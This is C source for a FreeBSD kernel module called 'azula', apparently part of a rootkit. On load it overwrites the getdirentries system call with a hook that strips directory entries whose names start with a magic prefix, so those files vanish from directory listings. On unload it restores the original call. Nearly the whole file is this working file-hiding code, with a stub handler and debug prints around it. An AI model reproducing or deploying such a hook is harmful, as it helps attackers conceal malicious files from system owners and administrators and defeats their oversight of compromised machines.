#include "azula.h"


static int azula_getdirentries(struct thread *td, void *syscall_args){
    struct getdirentries_args *uap;
    uap = (struct getdirentries_args *)syscall_args;

    unsigned int directory_content, count;
    struct dirent *dp, *current;

    // Make original call
    sys_getdirentries(td, syscall_args);

    // get the numbers of bytes of the directory listing
    directory_content = td->td_retval[0];

    if (directory_content > 0){
    //     // HERE"S THE ISSUE -- FUCK FREEBSD
    //     //MALLOC(dp, struct dirent*, directory_content, M_TEMP, M_NOWAIT);

        dp = malloc(directory_content, M_TEMPBUFFER, M_NOWAIT);
        // Copy the dirent struct from user buffer into kernel
        copyin(uap->buf, dp, directory_content);

        // Point to the first entry
        current = dp;
        count = directory_content;

        #if VERBOSE
            uprintf("CURRENT LENGTH: %d\n", current->d_reclen);
            uprintf("CURRENT TYPE: %d\n", current->d_type);
            uprintf("CURRENT NAME: %s\n", current->d_name);
            uprintf("COUNT: %d\n", count);
        #endif

        // Iterate through directory entries
        while ((current->d_reclen != 0) && (count > 0)){
            /* code */
            count -= current->d_reclen;

            #if VERBOSE 
                uprintf("FILE NAME: %s\n", current->d_name);
            #endif

            if(memcmp((char *)&(current->d_name), MAGIC_PREFIX, 5) == 0){
                #if VERBOSE
                    uprintf("same length\n");
                #endif

                if (count != 0){
                    bcopy((char *)current + current->d_reclen, current, count);
                }

                directory_content -= current->d_reclen;
                break;
            }

            if (count != 0){
                current = (struct dirent *)((char *)current + current->d_reclen);
            }
        }


        td->td_retval[0] = directory_content;
        copyout(dp, uap->buf, directory_content);

        free(dp, M_TEMPBUFFER);
        
    }
    return (0);
}

// Abandon this for now
struct sys_args{
    char *option;
};

static int azula_handler(struct thread *t, void *args){

    return(0);
}

static struct sysent handler = {
    0, /* number of argument */
    azula_handler /* impementing function */
};


static int offset = 216;

static int load(struct module *module, int cmd, void *args){
    int error = 0;
    switch (cmd){
        case MOD_LOAD:
        #if VERBOSE
            uprintf("Module Loaded\n");
        #endif
            sysent[SYS_getdirentries].sy_call = (sy_call_t *)azula_getdirentries;
            break;
        case MOD_UNLOAD:
        #if VERBOSE
            uprintf("Module Unloaded\n");
        #endif
            sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }
    return(error);
}

SYSCALL_MODULE(azula, &offset, &handler, load, 0);
